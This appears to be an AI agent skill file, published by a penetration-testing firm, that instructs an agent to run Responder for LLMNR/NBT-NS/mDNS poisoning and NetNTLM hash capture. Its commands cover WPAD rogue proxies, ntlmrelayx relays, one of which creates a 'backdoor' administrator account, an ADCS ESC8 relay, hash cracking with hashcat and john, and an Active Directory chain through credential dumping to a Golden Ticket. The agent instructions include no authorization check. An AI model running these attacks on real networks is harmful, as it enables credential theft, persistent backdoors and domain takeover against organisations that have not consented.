---
name: responder
description: >
  Operate Responder — the LLMNR/NBT-NS/mDNS poisoner and credential capture framework
  maintained at lgandx/Responder (6.1k+ stars). Use when performing internal network
  attacks that exploit Windows name resolution fallback to capture NTLMv1/NTLMv2 hashes,
  setting up WPAD rogue proxies, relaying credentials with ntlmrelayx, or chaining into
  Active Directory attack paths. Covers poisoning mechanics, interface selection, analyze
  mode, WPAD, captured hash locations, hash types, relay attacks, Responder.conf tuning,
  MultiRelay, and hashcat/john cracking integration.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/lgandx/Responder
---

# responder Agent Skill

## When to Use This Skill

Use this skill when:
- Performing internal network penetration tests on Windows environments
- The user wants to capture NTLMv1 or NTLMv2 hashes without user interaction
- Setting up WPAD rogue proxy attacks to intercept HTTP traffic
- Relaying captured credentials to other hosts with ntlmrelayx
- Chaining Responder into an Active Directory lateral movement or privilege escalation path
- The user asks about LLMNR, NBT-NS, mDNS poisoning, or NTLM relay

## What Responder Does

Responder listens on the network for broadcast and multicast name resolution requests (LLMNR, NBT-NS, mDNS) that Windows systems emit when DNS fails to resolve a hostname. By spoofing authoritative responses, Responder tricks targets into authenticating to an attacker-controlled service, capturing NetNTLM challenge-response hashes. Those hashes can be cracked offline or relayed to other hosts for lateral movement without needing to crack the password.

## Installation

```bash
# Kali Linux (pre-installed at /usr/share/responder or /opt/responder)
which responder || sudo apt install responder
ls /usr/share/responder/

# Clone from GitHub (recommended — always latest)
git clone https://github.com/lgandx/Responder.git /opt/responder
cd /opt/responder
pip3 install -r requirements.txt   # Typically no external deps needed

# Verify
python3 /opt/responder/Responder.py --help

# On Kali, Responder is also symlinked:
responder --help
```

## Core Concepts

### How LLMNR / NBT-NS / mDNS Poisoning Works

1. A Windows host attempts to resolve `\\fileserver` (e.g., a mistyped UNC path, net use, a failed DNS lookup).
2. DNS fails to resolve the name.
3. Windows falls back to **LLMNR** (Link-Local Multicast Name Resolution — UDP 5355) and **NBT-NS** (NetBIOS Name Service — UDP/TCP 137) broadcast queries.
4. Responder hears the broadcast and replies first: "I am `fileserver`, connect to me."
5. The target connects to Responder's rogue services (SMB, HTTP, LDAP, etc.) and submits NetNTLM credentials.
6. Responder logs the challenge-response hash.

**mDNS** (Multicast DNS — UDP 5353) is exploited the same way, more common on macOS and Linux.

### Hash Types Captured

| Type | Format | Hashcat Mode | Crack Speed |
|------|--------|-------------|-------------|
| NTLMv1 | `user::domain:challenge:hash:challenge` | 5500 | Very fast (GPU) |
| NTLMv1 with ESS | Same but extended session security | 5500 | Fast |
| NTLMv2 | `user::domain:challenge:NTProofStr:blob` | 5600 | Slower than v1 |

NTLMv1 is rare in modern environments but significantly easier to crack. NTLMv2 is the default and common.

### Captured Hash Storage

```
/opt/responder/logs/
├── Analyzer-Session.log         # Analyze mode log (passive)
├── HTTP-NTLMv2-10.10.10.50.txt  # Per-host NTLMv2 hash files
├── SMB-NTLMv2-10.10.10.50.txt
├── FTP-ClearText-10.10.10.50.txt
├── HTTP-Clear-Text-10.10.10.50.txt
├── HTTP-BasicAuth-10.10.10.50.txt
└── Responder-Session.log        # Full session log
```

## CLI Reference

```bash
# Basic syntax
python3 /opt/responder/Responder.py -I <interface> [options]

# Core flags
-I eth0          # Interface to listen on (REQUIRED)
-A               # Analyze mode — passive listening, no poisoning (recon)
-w               # Enable WPAD rogue proxy server
-F               # Force WPAD authentication (trigger even without proxy config)
-b               # Enable HTTP Basic Auth instead of NTLM for HTTP
-v               # Verbose output — show each poison and capture event
-f               # Fingerprint hosts — identify OS via passive analysis
--lm             # Force LM hashing downgrade (NTLMv1/LM — legacy targets)
--disable-ess    # Disable Extended Session Security (NTLMv1 only)
-d               # Enable DHCP poisoning (inject WPAD via DHCP)
-D               # DHCP DNS injection (add DNS entry via DHCP offer)
-P               # Use Proxy Auth for WPAD (forces cleartext creds)

# Common invocations
# Full poison mode (default — all protocols)
python3 Responder.py -I eth0

# Analyze only — listen but never respond (safe recon)
python3 Responder.py -I eth0 -A

# With WPAD proxy
python3 Responder.py -I eth0 -w -F

# Force basic auth (cleartext HTTP password capture)
python3 Responder.py -I eth0 -b

# Verbose with WPAD and forced auth
python3 Responder.py -I eth0 -wFv

# Fingerprinting mode
python3 Responder.py -I eth0 -Afv

# Specific interface with all features
python3 Responder.py -I eth0 -wFbv --lm
```

## Responder.conf — Configuration Tuning

Located at `/opt/responder/Responder.conf`. Edit before launching to control which services are active.

```ini
[Responder Core]
; Network interface to use (overridden by -I flag)
; Interface = eth0

; Disable specific servers to avoid conflicts (e.g., if host runs a real SMB)
SQL     = On     ; MSSQL — capture SQL auth
SMB     = On     ; SMB — primary hash capture vector
Kerberos = On    ; Kerberos — rarely useful but leave on
FTP     = On     ; FTP cleartext
POP     = On
SMTP    = On
IMAP    = On
HTTP    = On     ; HTTP NTLM and Basic
HTTPS   = On     ; HTTPS (self-signed cert)
DNS     = On     ; DNS spoofing
LDAP    = On     ; LDAP NTLM

[HTTP Server]
; Force NTLM auth on HTTP (default)
Auth = NTLM      ; or Basic for cleartext

[HTTPS Server]
; Self-signed cert details
SSLCert   = /opt/responder/certs/responder.crt
SSLKey    = /opt/responder/certs/responder.key

[Responder]
; Challenge used in NTLM handshake
Challenge = Random    ; or specific hex: 1122334455667788
```

### Disable SMB/HTTP when running ntlmrelayx

When relaying, you MUST disable SMB and HTTP in Responder.conf (set `SMB = Off`, `HTTP = Off`), then run ntlmrelayx separately:

```ini
SMB = Off
HTTP = Off
```

## Common Workflows

### Standard Hash Capture

```bash
# Step 1: Identify active interface
ip a  # Note the interface connected to target subnet

# Step 2: Start Responder
python3 /opt/responder/Responder.py -I eth0 -v

# Step 3: Wait — any Windows host trying to resolve a non-existent share triggers capture
# [+] Poisoning: Sending LLMNR response to 10.10.10.50 for name fileserver01
# [SMB] NTLMv2-SSP Client   : 10.10.10.50
# [SMB] NTLMv2-SSP Username : DOMAIN\jsmith
# [SMB] NTLMv2-SSP Hash     : jsmith::DOMAIN:aad3b435...:...

# Step 4: Crack the hash
cat /opt/responder/logs/SMB-NTLMv2-10.10.10.50.txt
hashcat -m 5600 /opt/responder/logs/SMB-NTLMv2-10.10.10.50.txt \
        /opt/seclists/Passwords/Leaked-Databases/rockyou.txt \
        --force
```

### Analyze Mode — Passive Recon

```bash
# Identify hosts broadcasting name resolution without poisoning
python3 /opt/responder/Responder.py -I eth0 -A -v

# Output reveals:
# - Which hosts are broadcasting LLMNR/NBT-NS requests
# - What hostnames they are querying (leaked internal naming conventions)
# - Operating system fingerprints via SMB dialect
# - Perfect for stealth recon before active attacks
```

### WPAD Rogue Proxy Attack

```bash
# WPAD: Web Proxy Auto-Discovery — Windows auto-configures proxy via wpad.dat
# If wpad.dat is not hosted by a legitimate server, Windows asks LLMNR/NBT-NS for "wpad"

# Start Responder with WPAD enabled and force auth
python3 /opt/responder/Responder.py -I eth0 -w -F -v

# When a host tries to find wpad.domain.local:
# 1. Responder poisons the request → points host to attacker IP
# 2. Responder serves a wpad.dat: PROXY attacker:3128
# 3. Browser connects to Responder's HTTP server
# 4. Responder challenges with NTLM → captures hash
```

### NTLM Relay Attack — Credential Relay Without Cracking

```bash
# Requirements:
# 1. SMB signing disabled on target (verify with: nmap --script smb2-security-mode -p 445 10.10.10.0/24)
# 2. Captured credential must have rights on the relay target

# Step 1: Disable SMB and HTTP in Responder.conf
# SMB = Off
# HTTP = Off

# Step 2: Start Responder (still poisons, but doesn't serve SMB/HTTP)
python3 /opt/responder/Responder.py -I eth0 -v

# Step 3: Start ntlmrelayx from impacket (separate terminal)
# Basic relay — opens interactive shell
python3 /opt/impacket/examples/ntlmrelayx.py -t smb://10.10.10.20 -smb2support

# Relay and execute command
python3 /opt/impacket/examples/ntlmrelayx.py \
  -t smb://10.10.10.20 \
  -smb2support \
  -c "net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add"

# Relay to multiple targets (targets.txt = one IP per line)
python3 /opt/impacket/examples/ntlmrelayx.py \
  -tf targets.txt \
  -smb2support \
  -l /tmp/loot/

# Relay to LDAP (dump AD info or add computer account for AD escalation)
python3 /opt/impacket/examples/ntlmrelayx.py \
  -t ldap://dc01.domain.local \
  --escalate-user compromised_user

# Relay to LDAPS (with AD CS — ESC8 attack)
python3 /opt/impacket/examples/ntlmrelayx.py \
  -t https://ca.domain.local/certsrv/certfnsh.asp \
  --adcs --template DomainController
```

### Cracking Captured Hashes

```bash
# NTLMv2 (most common)
hashcat -m 5600 /opt/responder/logs/SMB-NTLMv2-*.txt \
        /opt/seclists/Passwords/Leaked-Databases/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule

# NTLMv1 (faster to crack)
hashcat -m 5500 /opt/responder/logs/SMB-NTLMv1-*.txt \
        /opt/seclists/Passwords/Leaked-Databases/rockyou.txt

# John the Ripper
john --wordlist=/opt/seclists/Passwords/Leaked-Databases/rockyou.txt \
     /opt/responder/logs/SMB-NTLMv2-10.10.10.50.txt \
     --format=netntlmv2

# Check cracked passwords
john --show /opt/responder/logs/SMB-NTLMv2-10.10.10.50.txt
```

## Advanced Techniques

### MultiRelay

MultiRelay is a built-in Responder component for SMB relay (older approach — ntlmrelayx is preferred):

```bash
# List hosts with SMB signing disabled
python3 /opt/responder/tools/RunFinger.py -i 10.10.10.0/24

# Run MultiRelay against a specific target
# (Disable SMB in Responder.conf first)
python3 /opt/responder/tools/MultiRelay.py -t 10.10.10.20 -u ALL
```

### Force NTLMv1 Downgrade

Some older or misconfigured hosts may send NTLMv1 if challenged correctly:

```bash
# Set challenge to a known value in Responder.conf
Challenge = 1122334455667788

# Enable LM downgrade flag
python3 Responder.py -I eth0 --lm --disable-ess

# NTLMv1 without ESS → crack with crack.sh or hashcat -m 5500
# Can also derive NTLM hash directly from NTLMv1 using rainbow tables at crack.sh
```

### AD Attack Chain Integration

```
Responder captures NTLMv2 hash
        ↓
Crack with hashcat → plaintext password
        ↓
NetExec to spray password across domain
        ↓
Find machine with domain admin session (--logged-on-users)
        ↓
lsassy/mimikatz module to dump additional credentials
        ↓
Pass-the-hash or Golden Ticket
```

## Troubleshooting

**No hashes captured:**
- Confirm you are on the same broadcast domain as targets (same VLAN/subnet)
- Verify LLMNR/NBT-NS is enabled on targets: `Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters -Name NodeType` (not 2 = disabled)
- Use analyze mode first (`-A`) to confirm broadcasts are visible
- Some hardened environments disable LLMNR via Group Policy

**Error: Address already in use (port 445):**
```bash
# Stop any service occupying port 445
sudo systemctl stop smbd
sudo systemctl stop nmbd
# Then restart Responder
```

**Responder not starting on Kali:**
```bash
# Verify Python 3 and pip
python3 --version
# Run as root (required for raw socket binding)
sudo python3 /opt/responder/Responder.py -I eth0
```

**Hashes not cracking:**
- User has a strong password — try rules: `-r dive.rule`, `-r OneRuleToRuleThemAll.rule`
- Try relay instead of cracking — hashes don't need to be cracked for relay
- Confirm hash format is correct (copy entire line including username and domain)

**ntlmrelayx fails to relay:**
- Confirm SMB signing is disabled: `nmap --script smb2-security-mode -p 445 <target>`
- Ensure port 445 is not firewalled between attacker and relay target
- Try `-smb2support` flag explicitly
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [5 Active Directory Misconfigurations We See in Every Engagement](https://redhound.us/ad-misconfigurations)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
